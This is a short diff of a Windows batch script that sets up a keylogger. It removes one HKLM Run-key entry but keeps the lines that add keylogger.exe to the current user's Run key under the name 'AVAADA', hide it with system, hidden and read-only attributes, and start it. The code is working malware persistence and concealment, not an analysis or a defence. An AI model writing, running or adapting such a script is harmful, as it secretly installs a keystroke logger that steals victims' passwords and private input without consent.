@@ -33,7 +33,6 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %userprofile%\Desktop\keylogger.exe /f > nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %userprofile%\Desktop\keylogger.exe /f > nul
 attrib +s +h +r %userprofile%\Desktop\keylogger.exe
 start %userprofile%\Desktop\keylogger.exe
